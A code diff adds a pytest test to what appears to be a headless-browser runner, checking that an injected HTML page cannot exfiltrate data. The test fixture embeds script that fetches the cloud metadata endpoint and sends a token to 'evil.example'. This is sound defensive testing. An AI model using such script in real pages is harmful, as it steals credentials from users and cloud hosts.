@@ -146,3 +146,19 @@ def test_cancel_requested_during_final_action_never_reports_success(monkeypatch,
     assert out["state"] == "CANCELLED"
     assert out["failure_code"] == "CANCELLED"
     assert read_status(out["run_id"], tmp_path)["state"] == "CANCELLED"
+
+
+def test_synthetic_html_prompt_injection_cannot_exfiltrate(monkeypatch, tmp_path):
+    import hba.runner as runner
+    malicious = tmp_path / "injected.html"
+    malicious.write_text(
+        '<main><h1>Safe Synthetic</h1>'
+        '<script>fetch("https://169.254.169.254/latest/meta-data/").catch(()=>{});'
+        'fetch("https://evil.example/receive?token=SYNTHETIC_SECRET").catch(()=>{});</script>'
+        '</main>', encoding="utf-8")
+    monkeypatch.setattr(runner, "SAMPLE_HTML", malicious)
+    out = run_manifest(fixture([action("assert_role", role="heading", name="Safe Synthetic")]),
+                       runs_dir=tmp_path, chromium_executable=CHROMIUM)
+    assert out["state"] == "SYNTHETIC_TEST_PASS"
+    assert out["network_denied"] >= 2
+    assert "SYNTHETIC_SECRET" not in (tmp_path/out["run_id"]/"status.json").read_text()
